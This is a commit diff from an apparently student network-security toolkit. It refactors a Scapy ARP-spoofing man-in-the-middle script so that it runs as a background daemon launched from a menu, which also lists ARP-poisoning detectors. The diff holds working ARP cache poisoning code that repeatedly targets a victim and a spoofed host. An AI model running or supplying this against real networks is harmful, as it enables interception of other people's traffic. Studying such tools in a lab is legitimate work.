6ff27b486617c6d258712339304922897e2ffc50
professor-oats <chronophob@gmail.com>
2024-11-02 02:02:37 +0100

    working spaghetti daemon for arp_mitm

--- Project1/PacketPapi/mitm_arp.py
+++ Project1/PacketPapi/mitm_arp.py
@@ -1,25 +1,15 @@
-from scapy.layers.l2 import ARP, Ether, getmacbyip, get_if_hwaddr
-from scapy.all import sendp, conf
+from scapy.layers.l2 import ARP, Ether
+from scapy.all import sendp
 import os
 import time
-import ipaddress
 
 
 # Ensure that you have IP forwarding on the attacker machine (Linux example)
 # os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-# Just a check to see if the IP is correctly formatted
-def is_valid_ip(target):
-  try:
-    ipaddress.ip_address(target)
-    return True
-  except ValueError:
-    return False
-
 def spoof_arp(target_ip, target_mac, spoof_ip, attacker_mac):
   # Send an ARP reply to `target_ip`, telling it that `spoof_ip`
   # is associated with the attacker's MAC address.
-  # Using broadcast
 
   # Create an Ethernet frame with the correct target MAC address
   ether = Ether(src=attacker_mac, dst=target_mac)
@@ -38,38 +28,22 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac, attacker_mac):
   packet = ether / arp
   sendp(packet, count=5, verbose=False)
 
-def main():
 
-  while True:
-    victim_ip = input("Declare the IP of the victim you want to target:\n")
-    if is_valid_ip(victim_ip):
-      break
-    print("Wrong IP format")
+# Spaghetti code. Will do *args on this ...
+def main(in_victim_ip, in_victim_mac, in_spoofed_ip_origin, in_spoofed_mac_origin, in_attacker_mac):
 
-  victim_mac = getmacbyip(victim_ip)
-
-  while True:
-    spoofed_ip_origin = input("Declare the IP of the target want to spoof as:\n")
-    if is_valid_ip(spoofed_ip_origin):
-      break
-    print("Wrong IP format")
-
-  spoofed_mac_origin = getmacbyip(spoofed_ip_origin)
-
-  attacker_mac = get_if_hwaddr(conf.iface)  # Replace with your machine's MAC address
-
-  print(f"Starting ARP spoofing as {spoofed_ip_origin} for victim {victim_ip}...")
+  print(f"Starting ARP spoofing as {in_spoofed_ip_origin} for victim {in_victim_ip}...")
   try:
     while True:
       # Tell the victim that the spoofed IP is at the attacker's MAC
-      spoof_arp(victim_ip, victim_mac, spoofed_ip_origin, attacker_mac)
+      spoof_arp(in_victim_ip, in_victim_mac, in_spoofed_ip_origin, in_attacker_mac)
       # Tell the machine we spoof that the victim is at the attacker's MAC
-      spoof_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, attacker_mac)
+      spoof_arp(in_spoofed_ip_origin, in_spoofed_mac_origin, in_victim_ip, in_attacker_mac)
       time.sleep(2)  # Repeat every 2 seconds to maintain the MITM position
   except KeyboardInterrupt:
     print("Stopping ARP spoofing and restoring ARP tables...")
-    restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
-    restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)   # Original victim_mac_here
+    restore_arp(in_victim_ip, in_victim_mac, in_spoofed_ip_origin, in_spoofed_mac_origin, in_attacker_mac)  # Original spoofed_mac_here
+    restore_arp(in_spoofed_ip_origin, in_spoofed_mac_origin, in_victim_ip, in_victim_mac, in_attacker_mac)   # Original victim_mac_here
 
 if __name__ == "__main__":
   main()
--- Project1/PacketPapi/packetpapi.py
+++ Project1/PacketPapi/packetpapi.py
@@ -1,6 +1,10 @@
 from . import multipleMACdetect
 from . import arppoison_monitor
 from . import mitm_arp
+from scapy.layers.l2 import getmacbyip, get_if_hwaddr
+from scapy.all import conf
+import multiprocessing
+import ipaddress
 
 BANNER = """
 \033[34m#######################################
@@ -19,6 +23,14 @@ CATEGORIES = """\033[1m\033[95mOFFENSIVE SCRIPTS\033[0m
 [\033[97mB\033[0m]ack
 """
 
+# Just a check to see if the IP is correctly formatted
+def is_valid_ip(target):
+  try:
+    ipaddress.ip_address(target)
+    return True
+  except ValueError:
+    return False
+
 def main():
   print(BANNER)
 
@@ -27,7 +39,31 @@ def main():
     userchoice = input("")
 
     if userchoice.strip().lower() == "c":
-      mitm_arp.main()
+
+      while True:
+        victim_ip = input("Declare the IP of the victim you want to target:\n")
+        if is_valid_ip(victim_ip):
+          break
+        print("Wrong IP format")
+
+      victim_mac = getmacbyip(victim_ip)
+
+      while True:
+        spoofed_ip_origin = input("Declare the IP of the target want to spoof as:\n")
+        if is_valid_ip(spoofed_ip_origin):
+          break
+        print("Wrong IP format")
+
+      spoofed_mac_origin = getmacbyip(spoofed_ip_origin)
+
+      attacker_mac = get_if_hwaddr(conf.iface)  # Replace with your machine's MAC address
+
+      mitm_arp_process = multiprocessing.Process(
+        target=mitm_arp.main,
+        args=(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac),
+        daemon=True  # This will automatically terminate when main script exits
+      )
+      mitm_arp_process.start()
 
     elif userchoice.strip().lower() == "a":
       arppoison_monitor.main()
@@ -36,6 +72,7 @@ def main():
       multipleMACdetect.main()
 
     elif userchoice.strip().lower() == "b":
+
       return
 
 
